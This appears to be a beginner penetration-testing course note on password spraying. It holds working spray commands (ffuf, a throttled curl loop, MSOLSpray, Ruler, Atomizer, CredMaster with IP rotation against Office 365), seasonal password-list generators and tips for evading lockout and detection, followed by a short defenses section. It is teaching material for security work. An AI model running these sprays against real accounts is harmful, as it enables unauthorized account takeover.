---
tags: [vapt, authentication, beginner]
difficulty: beginner
module: "16 - Authentication"
topic: "16.04 Password Spraying"
---

# 16.04 — Password Spraying

## What Is Password Spraying?

```
THE LOCKOUT PROBLEM:
  Brute force: Try 1000 passwords against one account
  → Account locks after 5-10 failed attempts!
  
PASSWORD SPRAYING:
  Try 1-2 passwords against MANY accounts instead!
  → No single account ever hits the lockout threshold!
  
  EXAMPLE (lockout threshold = 5):
  Try "Spring2024!" against alice, bob, carol, dave, eve...
  → None of them get locked out (only tried once each)
  → If even 1% of users has this password → you get in!
  
COMMON SPRAY PASSWORDS:
  Seasonal: Summer2024!, Winter2023!, Spring2024
  Company name variants: Company1!, Companyname123
  Simple: Password1!, Welcome1, Letmein1!
  Month+Year: January2024!, February2024!
  Policy-minimum: Usually 8 chars, 1 upper, 1 lower, 1 digit = "Password1"
```

---

## Web Application Spraying

```bash
# BURP INTRUDER — PITCHFORK MODE:
# POST /login
# email=§email§&password=§password§
# 
# Payload Set 1 (Position 1 - email): users.txt
# Payload Set 2 (Position 2 - password): same_password_for_all.txt
#   (just one password, repeated for each user)
# 
# OR: Cluster Bomb mode
#   Payload Set 1: emails.txt
#   Payload Set 2: spray_passwords.txt (3-5 common passwords)
# → tries all combinations but keep passwords list SHORT (< threshold - 1)

# FFUF:
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -X POST -u https://target.com/login \
  -d "email=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mode pitchfork \
  -mc 302  # success = redirect

# SLOW SPRAY (avoid detection):
for user in $(cat users.txt); do
    curl -s -o /dev/null -w "$user: %{http_code}\n" \
      -X POST https://target.com/login \
      -d "email=$user&password=Spring2024!" \
      -c /tmp/cookies.txt
    sleep 3  # wait 3 seconds between each
done
```

---

## Active Directory / Corporate Spraying

```bash
# SPRAY AGAINST OFFICE 365 / AZURE AD:
# Tool: MSOLSpray (PowerShell)
Import-Module MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!" -Domain company.com

# TOOL: Ruler (Exchange/EWS)
ruler --domain company.com brute --users users.txt --passwords "Password1!"

# TOOL: SprayingToolkit / Atomizer
python3 atomizer.py owa https://mail.company.com passwords.txt users.txt

# OBSERVE WAIT TIMES:
# O365 smart lockout: 30 min after 10 failures from SAME IP
# Spray 1 password per 45-60 min to avoid smart lockout!

# TOOL: CredMaster (uses API gateways to rotate IPs)
# github.com/knavesec/CredMaster
python3 credmaster.py --plugin o365 \
  -u users.txt -p passwords.txt -t 4 --jitter 2 --jitter-min 1
```

---

## Building Spray Wordlists

```bash
# GENERATE SEASONAL PASSWORDS SCRIPT:
python3 -c "
seasons = ['Spring', 'Summer', 'Fall', 'Winter', 'Autumn']
years = ['2022', '2023', '2024']
suffixes = ['!', '1', '1!', '123', '@1']
for s in seasons:
    for y in years:
        for x in suffixes:
            print(f'{s}{y}{x}')
"

# COMMON CORPORATE PATTERNS:
# Company123!  Companyname1  CompanyQ1!  CompanyIT1!

# MONTH PATTERNS:
for month in January February March April May June July August September October November December; do
    echo "${month}2024!"
    echo "${month}2024"
done
```

---

## Fix

```
DEFENSES:
  ✓ MFA — sprayed password useless without second factor
  
  ✓ Smart lockout policies:
    - Count failures per ACCOUNT (prevents brute force)
    - ALSO flag many different account failures from same IP 
      (prevents spraying)
    
  ✓ Behavioral detection:
    - Alert on: 1 IP → many different accounts, same password
    - Alert on: Same password across many accounts in short window
    
  ✓ Strong password policy:
    - Enforce complexity → spray wordlists less effective
    - Block common passwords (HIBP API integration)
    
  ✓ Privileged accounts (admin): use hardware MFA (FIDO2/YubiKey)
```

---

## Related Notes
- [[01 - Username Enumeration]] — build target user list first
- [[02 - Password Brute Force]] — high-rate vs slow-spread comparison
- [[10 - Account Lockout Bypass]] — other lockout bypass techniques
- [[28 - Defense Rate Limiting Lockout MFA]] — full defense guide
